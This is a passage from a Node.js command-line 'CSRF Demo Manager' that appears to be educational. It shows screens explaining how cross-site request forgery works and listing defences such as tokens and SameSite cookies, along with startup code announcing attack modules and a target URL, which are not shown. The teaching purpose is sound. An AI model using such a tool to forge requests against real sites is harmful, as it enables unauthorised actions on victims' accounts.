        case '5':
            return;
    }

    await ask(`\n  ${C.dim}Press Enter to continue...${C.reset}`);
}

function showCSRFExplanation() {
    clearScreen();
    printBanner();
    console.log(`
  ${C.cyan}┌─────────────────────────────────────────────────────────────┐${C.reset}
  ${C.cyan}│${C.reset} ${C.bright}${C.white}📖 CSRF THEORY${C.reset}                                            ${C.cyan}│${C.reset}
  ${C.cyan}├─────────────────────────────────────────────────────────────┤${C.reset}
  ${C.cyan}│${C.reset}                                                             ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}  ${C.yellow}CSRF${C.reset} (Cross-Site Request Forgery) tricks a user's       ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}  browser into making unwanted requests to a target site.  ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}                                                             ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}  ${C.bright}ATTACK FLOW:${C.reset}                                          ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}                                                             ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}  ${C.green}[1]${C.reset} VICTIM logs into target site (e.g., bank.com)          ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}     → Browser stores session cookie                        ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}                                                             ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}  ${C.green}[2]${C.reset} VICTIM visits attacker's website                       ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}     → Page contains hidden form targeting bank.com         ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}                                                             ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}  ${C.green}[3]${C.reset} HIDDEN FORM auto-submits (or user clicks)              ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}     → Browser automatically attaches session cookie        ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}                                                             ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}  ${C.green}[4]${C.reset} TARGET SERVER receives request with valid cookie       ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}     → Processes it as a legitimate user action!            ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}                                                             ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}  ${C.red}RESULT:${C.reset} Money transferred, email changed, etc.             ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}          WITHOUT the user's knowledge or consent!           ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}                                                             ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}  ${C.bright}WHY IT WORKS:${C.reset}                                        ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}  - Browsers automatically send cookies with every request   ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}  - Servers can't distinguish between intentional and        ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}    forged requests when cookies are present                ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}  - No origin verification by default                        ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}                                                             ${C.cyan}│${C.reset}
  ${C.cyan}└─────────────────────────────────────────────────────────────┘${C.reset}
`);
}

function showProtectionGuide() {
    clearScreen();
    printBanner();
    console.log(`
  ${C.cyan}┌─────────────────────────────────────────────────────────────┐${C.reset}
  ${C.cyan}│${C.reset} ${C.bright}${C.white}🛡️  DEFENSE MECHANISMS${C.reset}                                    ${C.cyan}│${C.reset}
  ${C.cyan}├─────────────────────────────────────────────────────────────┤${C.reset}
  ${C.cyan}│${C.reset}                                                             ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}  ${C.green}[1]${C.reset} CSRF TOKENS ⭐ (Best Defense)                          ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}     - Generate unique token per session                    ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}     - Include in all forms/requests                        ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}     - Verify token on server before processing             ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}     - Attacker can't guess the token                       ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}                                                             ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}  ${C.green}[2]${C.reset} SAMEsite COOKIES                                       ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}     - Set-Cookie: session=xxx; SameSite=Strict            ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}     - Browser won't send cookie on cross-site requests     ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}     - Lax mode allows top-level navigation (safer UX)      ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}                                                             ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}  ${C.green}[3]${C.reset} CHECK ORIGIN/REFERER HEADERS                           ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}     - Verify Origin header matches your domain             ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}     - Check Referer header as backup                       ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}                                                             ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}  ${C.green}[4]${C.reset} RE-AUTHENTICATION                                      ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}     - Require password for sensitive actions               ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}     - Add CAPTCHA for critical operations                  ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}                                                             ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}  ${C.green}[5]${C.reset} CUSTOM REQUEST HEADERS                                 ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}     - Add X-Requested-With: XMLHttpRequest                  ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}     - Cross-origin requests can't set custom headers       ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}       without CORS preflight                               ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}                                                             ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}  ${C.yellow}DEFENSE IN DEPTH: Use multiple layers!${C.reset}                    ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}                                                             ${C.cyan}│${C.reset}
  ${C.cyan}└─────────────────────────────────────────────────────────────┘${C.reset}
`);
}

// ============================================
// CLI HELPERS
// ============================================
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
});

function ask(question) {
    return new Promise(resolve => rl.question(question, resolve));
}

// ============================================
// STARTUP SEQUENCE
// ============================================
async function startupSequence() {
    clearScreen();
    console.log('');
    console.log(`${C.green}${C.bright}
  ██████╗███████╗██████╗ ███████╗
 ██╔════╝██╔════╝██╔══██╗██╔════╝
 ██║     ███████╗██████╔╝█████╗
 ██║     ╚════██║██╔══██╗██╔══╝
 ╚██████╗███████║██║  ██║██║
  ╚═════╝╚══════╝╚═╝  ╚═╝╚═╝${C.reset}`);
    console.log(`${C.dim}  ════════════════════════════════════════════════════════════${C.reset}`);
    console.log(`${C.green}${C.bright}  CSRF${C.reset}${C.dim} // Cross-Site Request Forgery Demo Manager v5.0${C.reset}`);
    console.log(`${C.dim}  ════════════════════════════════════════════════════════════${C.reset}`);
    console.log('');

    await typewriterEffect(`  ${C.cyan}[SYS]${C.reset} Initializing CSRF Demo Manager...`, 20);
    await new Promise(r => setTimeout(r, 300));
    console.log(`  ${C.green}[OK ]${C.reset} Configuration loaded`);
    await new Promise(r => setTimeout(r, 200));
    console.log(`  ${C.green}[OK ]${C.reset} Attack modules ready`);
    await new Promise(r => setTimeout(r, 200));
    console.log(`  ${C.green}[OK ]${C.reset} Target: ${config.targetUrl}`);
    await new Promise(r => setTimeout(r, 200));
    console.log(`  ${C.yellow}[WARN]${C.reset} FOR EDUCATIONAL PURPOSES ONLY`);
    await new Promise(r => setTimeout(r, 500));
    console.log('');
    console.log(`  ${C.dim}Press Enter to access main menu...${C.reset}`);
    await ask('');
}

function typewriterEffect(text, delay = 15) {
    return new Promise(resolve => {
        let i = 0;
        const interval = setInterval(() => {
            process.stdout.write(text[i]);
            i++;
            if (i >= text.length) {
                clearInterval(interval);
                resolve();
            }
        }, delay);
    });
}

// ============================================
// MAIN ENTRY POINT
// ============================================
(async () => {
    await startupSequence();
    await mainMenu();
})();
